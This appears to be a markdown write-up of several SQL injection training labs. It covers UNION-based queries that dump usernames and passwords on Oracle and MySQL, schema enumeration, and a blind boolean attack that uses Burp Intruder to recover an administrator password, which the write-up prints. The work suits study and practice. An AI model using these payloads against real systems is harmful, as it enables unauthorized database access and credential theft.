![image](https://github.com/user-attachments/assets/af46095b-1a12-445b-8ed6-aca36d66261c)
![image](https://github.com/user-attachments/assets/17e1c714-305d-4c5c-ae8c-42d6ca32cc04)
![image](https://github.com/user-attachments/assets/3f0364df-218d-4faf-ad1e-a5950345937a)
<img src="images/image24.png" alt="third" width="500">

**Step 1**

Checking number of columns. As done in previous lab

<img src="images/image25.png" alt="third" width="700">

**Step 2**

Inserting string to find a column that support String injection.

<img src="images/image26.png" alt="third" width="700">

Now trying in second column

<img src="images/image27.png" alt="third" width="700">

And we found the column

**Step3**

Now we don’t know which database is this so first we uses this query

`' UNION SELECT username || '~' || password FROM users--`

This is use to insert username and password concatenated in oracle database.

Modify the query to

`' UNION SELECT NULL,username || '~' || password FROM users--`

<img src="images/image28.png" alt="third" width="700">

The result show this is an oracle database. And the query executed successfully

**Step4:**

Search for administrator in response

<img src="images/image29.png" alt="third" width="500">

Now login with give credential. And lab will be solve.

<img src="images/image30.png" alt="third" width="500">

**Step1**

Check number of column

<img src="images/image31.png" alt="third" width="700">

**Step2**

Check in which column we can insert

<img src="images/image32.png" alt="third" width="700">

Here we are able to insert in both column

**Step3**

Now we use this payload

`' UNION SELECT @@version--`

Modify query to

`' UNION SELECT @@version,NULL#`

Or

`' UNION SELECT NULL,@@version#`

Encode it to URL

<img src="images/image33.png" alt="third" width="600">

And we have the answer

<img src="images/image34.png" alt="third" width="500">

<img src="images/image35.png" alt="third" width="500">

**Step 1:**

Click on any catrgories

<img src="images/image36.png" alt="third" width="500">

Send this request to repeater

<img src="images/image37.png" alt="third" width="500">

**Step2**

First we check number of column

<img src="images/image38.png" alt="third" width="700">

Here we have 2 column

**Step3**

Checking in which we can insert query

<img src="images/image39.png" alt="third" width="700">

We can insert query in both column

**Step4**

Listing all availble tabel using

`SELECT * FROM information_schema.tables`

Modify query to

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

Here is the response of query, we have a table

<img src="images/image40.png" alt="third" width="500">

**Step5**

We will get knowledge of column

Query

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_lctwqx'--`

<img src="images/image41.png" alt="third" width="500">

In response we can see column name for username and password

<img src="images/image42.png" alt="third" width="500">

**Step 6**

`' UNION SELECT username_qgkbjp, password_qrfngy FROM users_lctwqx--`

Using this query to extract all username and password

<img src="images/image43.png" alt="third" width="500">

Now login with this credential and lab will be solve.

<img src="images/image44.png" alt="third" width="500">

**Step 1:**

Click on any categories

<img src="images/image45.png" alt="third" width="500">

**Step2:**

Send this request to repeater

**Step3**

Check number of column

Using:`'UNION SELECT NULL,NULL FROM DUAL--`

<img src="images/image46.png" alt="third" width="500">

Now check point of insertion

`'UNION SELECT 'a','a' FROM DUAL--`

<img src="images/image47.png" alt="third" width="700">

So we can insert in both column

**Step4**

To list all content we use

`SELECT * FROM all_tables`

Modify query to

`'+UNION+SELECT+table_name,+NULL+FROM+all_tables--`

<img src="images/image48.png" alt="third" width="800">

In response we can see table users_mcujaa

**Step5**

We will get knowledge of column

Query

`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_MCUJAA' --`

<img src="images/image49.png" alt="third" width="500">

In response we have two column

<img src="images/image50.png" alt="third" width="500">

RESPONSE

**Step 6**

`' UNION SELECT USERNAME_ASRCUX,PASSWORD_UXRAYH FROM USERS_MCUJAA --`

<img src="images/image51.png" alt="third" width="500">

Using this query to extract all username and password

Responce 

<img src="images/image52.png" alt="third" width="500">

<img src="images/image53.png" alt="third" width="500">

**Step1**

Click on any categories

<img src="images/image54.png" alt="third" width="500">

**Step2**

Sending request to repeater

<img src="images/image55.png" alt="third" width="500">

**Step3**

Checking where welcome back message is shown by using the true condition and then using false condition
```
…xyz' AND '1'='1  
…xyz' AND '1'='2
```

<img src="images/image56.png" alt="third" width="700">

Response

<img src="images/image57.png" alt="third" width="500">

Now check using false condition

<img src="images/image58.png" alt="third" width="700">

Response

<img src="images/image59.png" alt="third" width="500">

As it is clear that we can inject query because there is a point of injection

**Step 4**

Now we know

Table:user

Column :username and password.

So first we extract first letter of password using

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

If result is welcome back then we say that first letter correct

For this we use intruder

<img src="images/image62.png" alt="third" width="900">

We select 't and apply a payload

The attack type is snipper

<img src="images/image61.png" alt="third" width="500">

This is payload setting

Now we have extracted password for our first character which is 1

<img src="images/image63.png" alt="third" width="500">

Because the length is different from other

And if I use

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='1`

In repeater the response contain welcome message.

<img src="images/image64.png" alt="third" width="500">

**Step5**

Now we find password for all index. To do it fast we use cluster bomb attack by selecting both index and character

<img src="images/image65.png" alt="third" width="900">

Payload setting

<img src="images/image66.png" alt="third" width="500">

Payload 2

<img src="images/image67.png" alt="third" width="500">

Apply filter welcome and we will have character that having response welcome with their corresponding indexes.

<img src="images/image68.png" alt="third" width="500">

1 6 8 o y c 4 s k s g 4 w c l 3 7 5 0 w

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20

**Password:168oyc4sksg4wcl3750w**
